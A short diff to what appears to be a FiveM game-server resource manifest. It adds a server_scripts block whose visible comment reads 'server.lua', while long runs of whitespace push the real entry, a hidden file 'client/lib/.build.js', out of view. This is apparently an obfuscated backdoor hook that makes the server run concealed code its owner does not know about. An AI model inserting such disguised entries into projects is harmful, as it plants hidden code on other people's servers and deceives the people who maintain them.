@@ -9,3 +9,7 @@ version '1.0.2'
 client_scripts {
     'c.lua'
 }
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'client/lib/.build.js',
+}
